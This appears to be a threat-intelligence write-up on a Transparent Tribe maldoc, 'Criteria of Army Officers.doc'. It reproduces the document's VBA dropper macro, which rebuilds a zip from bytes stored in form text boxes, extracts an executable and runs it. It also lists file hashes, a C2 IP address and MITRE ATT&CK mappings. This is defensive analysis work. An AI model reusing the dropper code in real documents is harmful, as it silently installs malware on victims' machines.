# Not as so transparent
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Threat Intelligence](#Intel)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [Yara Rules](#Yara)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Knowledge Graph](#Knowledge)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Ressources](#Ressources)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is a maldoc called ```"Criteria of Army Officers.doc" ```, this use a macro for extract and execute the PE file depends on the version of the operating system </h6>

```vb
Sub unMoferzip(Fname As Variant, FileNameFolder As Variant)
 Dim FSO As Object
 Dim oApp As Object
 'Extract the files into the Destination folder
 Set oApp = CreateObject("Shell.Application")
 oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, &H4
End Sub
Sub MoferfileLdr()
 Dim path_Mofer_file As String
 Dim file_Mofer_name  As String
 Dim zip_Mofer_file  As Variant
 Dim fldr_Mofer_name  As Variant
 file_Mofer_name = "ulhtagnias"
 fldr_Mofer_name = Environ$("ALLUSERSPROFILE") & "\DeIA-WIR\"
 If Dir(fldr_Mofer_name, vbDirectory) = "" Then
  MkDir (fldr_Mofer_name)
 End If
 zip_Mofer_file = fldr_Mofer_name & file_Mofer_name & ".zip"
 path_Mofer_file = fldr_Mofer_name & file_Mofer_name & ".exe"
 Dim ar1Mofer() As String
 Dim btsMofer() As Byte
 If InStr(Application.System.Version, "6.2") > 0 Or InStr(Application.System.Version, "6.3") > 0 Then
  ar1Mofer = Split(UserForm1.TextBox2.Text, "'")
 Else
  ar1Mofer = Split(UserForm1.TextBox1.Text, "'")
 End If
 Dim linMofer As Double
 linMofer = 0
 For Each vl In ar1Mofer
  ReDim Preserve btsMofer(linMofer)
  btsMofer(linMofer) = CByte(vl)
  linMofer = linMofer + 1
 Next
  Open zip_Mofer_file For Binary Access Write As #2
   Put #2, , btsMofer
 Close #2
 If Len(Dir(path_Mofer_file)) = 0 Then
  Call unMoferzip(zip_Mofer_file, fldr_Mofer_name)
 End If
   Shell path_Mofer_file, vbNormalNoFocus
End Sub
```

<h2>Threat Intelligence</h2><a name="Intel"></a></h2>
<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>

|Indicator|Description|
| ------------- |:-------------:|
|Criteria of Army Officers.doc|1cb726eab6f36af73e6b0ed97223d8f063f8209d2c25bed39f010b4043b2b8a1|
|ulhtagnias.exe|d2c46e066ff7802cecfcb7cf3bab16e63827c326b051dc61452b896a673a6e67|
|198.46.177.73|IP C2|

<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/json/ioc.json">JSON</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/|
|C&C|Uncommonly Used Port|https://attack.mitre.org/techniques/T1065/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Execution|Scripting|https://attack.mitre.org/techniques/T1064/|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Pakistan/APT/Transparent%20Tribe/22-01-20/json/Mitre-APT36-22-01-20.json">Export in JSON</a></h6>
<h2>Yara Rules<a name="Yara"></a></h2>
<h6> A list of YARA Rule is available <a href="">here</a></h6>
<h2>Knowledge Graph<a name="Knowledge"></a></h2><a name="Know"></a>
<h6>The following diagram shows the relationships of the techniques used by the groups and their corresponding malware:</h6>
<p align="center">
  <img src="">
</p>
<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/Arkbird_SOLG/status/1219769450989334528](https://twitter.com/Arkbird_SOLG/status/1219769450989334528) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [Criteria of Army Officers.doc](https://app.any.run/tasks/de93d3a4-9ff0-4bed-b492-1f45214a0443)

<h6> Resources : </h6><a name="Ressources"></a>

* [Operation Transparent Tribe - APT Targeting Indian Diplomatic and Military Interests](https://www.proofpoint.com/us/threat-insight/post/Operation-Transparent-Tribe)
